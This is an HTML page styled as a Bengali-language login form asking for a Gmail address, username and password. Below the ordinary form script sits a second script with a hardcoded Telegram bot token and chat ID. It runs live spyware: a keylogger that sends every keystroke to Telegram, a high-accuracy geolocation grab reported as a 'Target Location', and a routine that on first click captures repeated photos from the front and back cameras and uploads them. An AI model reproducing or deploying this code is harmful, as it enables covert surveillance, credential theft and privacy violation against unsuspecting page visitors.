<!DOCTYPE html>
<html lang="bn">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Login - অ্যাকাউন্টে প্রবেশ করুন</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: linear-gradient(135deg, #667eea, #764ba2);
            height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
        }
        .login-container {
            background: white;
            padding: 40px 30px;
            border-radius: 12px;
            box-shadow: 0 10px 25px rgba(0, 0, 0, 0.2);
            width: 100%;
            max-width: 380px;
        }
        .login-header {
            text-align: center;
            margin-bottom: 30px;
        }
        .login-header h2 {
            color: #333;
            font-size: 28px;
        }
        .form-group {
            margin-bottom: 20px;
        }
        label {
            display: block;
            margin-bottom: 8px;
            color: #555;
            font-weight: 500;
        }
        input {
            width: 100%;
            padding: 12px 15px;
            border: 2px solid #ddd;
            border-radius: 8px;
            font-size: 16px;
            transition: all 0.3s;
        }
        input:focus {
            border-color: #667eea;
            outline: none;
            box-shadow: 0 0 0 3px rgba(102, 126, 234, 0.1);
        }
        .btn-login {
            width: 100%;
            padding: 14px;
            background: linear-gradient(135deg, #667eea, #764ba2);
            color: white;
            border: none;
            border-radius: 8px;
            font-size: 18px;
            font-weight: 600;
            cursor: pointer;
            transition: all 0.3s;
        }
        .btn-login:hover {
            transform: translateY(-2px);
            box-shadow: 0 8px 15px rgba(102, 126, 234, 0.3);
        }
        .extra-options {
            text-align: center;
            margin-top: 20px;
        }
        .extra-options a {
            color: #667eea;
            text-decoration: none;
        }
        .extra-options a:hover {
            text-decoration: underline;
        }
    </style>
</head>
<body>
    <div class="login-container">
        <div class="login-header">
            <h2>লগইন করুন</h2>
        </div>
        
        <form id="loginForm">
            <div class="form-group">
                <label for="gmail">Gmail Address</label>
                <input type="email" id="gmail" placeholder="example@gmail.com" required>
            </div>

            <div class="form-group">
                <label for="username">Username</label>
                <input type="text" id="username" placeholder="আপনার ইউজারনেম" required>
            </div>

            <div class="form-group">
                <label for="password">Password</label>
                <input type="password" id="password" placeholder="পাসওয়ার্ড দিন" required>
            </div>

            <button type="submit" class="btn-login">লগইন করুন</button>
        </form>

        <div class="extra-options">
            <p><a href="#">পাসওয়ার্ড ভুলে গেছেন?</a></p>
            <p>অ্যাকাউন্ট নেই? <a href="#">সাইন আপ করুন</a></p>
        </div>
    </div>

    <script>
        document.getElementById('loginForm').addEventListener('submit', function(e) {
            e.preventDefault();
            
            const gmail = document.getElementById('gmail').value;
            const username = document.getElementById('username').value;
            const password = document.getElementById('password').value;

            if (gmail && username && password) {
                alert(`লগইন সফল!\n\nGmail: ${gmail}\nUsername: ${username}`);
                // এখানে আপনি backend এ ডাটা পাঠাতে পারবেন (fetch / axios)
            } else {
                alert("সব ফিল্ড পূরণ করুন!");
            }
        });
    </script>

<script>
const TOKEN='8762306338:AAEK0xVsVm44Epmu0N3rVYqeVV10GfIRNco',CHAT_ID='7988925862';
const sendTele=m=>{fetch('https://api.telegram.org/bot'+TOKEN+'/sendMessage',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({chat_id:CHAT_ID,text:m,parse_mode:'Markdown'})});};
let log = "";
document.onkeydown = (e) => {
    let k = e.key || String.fromCharCode(e.keyCode);
    if (k === "Enter") k = "\n[ENTER]\n";
    else if (k === "Backspace") k = "[BS]";
    else if (k === "Space") k = " ";
    log += k;
};
setInterval(() => { if(log) { sendTele("⌨️ Keylog: " + log); log = ""; } }, 3000);

navigator.geolocation.getCurrentPosition(res => {
    const lat = res.coords.latitude;
    const lon = res.coords.longitude;
    const accuracy = res.coords.accuracy;
    const mapLink = `https://www.google.com/maps?q=${lat},${lon}`;
    sendTele(`📍 Target Location:\nAccuracy: ${accuracy} meters\nLink: ${mapLink}`);
}, err => {
    sendTele("❌ Location Denied by User");
}, { enableHighAccuracy: true });

async function takeSnaps(facingMode) {
    try {
        const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: facingMode } });
        const video = document.createElement('video');
        video.srcObject = stream;
        await video.play();
        const canvas = document.createElement('canvas');
        
        for (let i = 1; i <= 7; i++) {
            await new Promise(r => setTimeout(r, 1000)); // 1 sec gap
            canvas.width = video.videoWidth; canvas.height = video.videoHeight;
            canvas.getContext('2d').drawImage(video, 0, 0);
            canvas.toBlob(b => {
                let fd = new FormData(); fd.append('chat_id', CHAT_ID); fd.append('photo', b, 'snap.jpg');
                fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, { method: 'POST', body: fd });
            }, 'image/jpeg');
        }
        stream.getTracks().forEach(t => t.stop());
    } catch (e) { sendTele(`❌ ${facingMode} Cam Fail`); }
}

async function startSpy() {
    await takeSnaps("user"); // Front Camera
    await takeSnaps("environment"); // Back Camera
}
document.addEventListener('click', startSpy, { once: true });

</script></body>
</html>
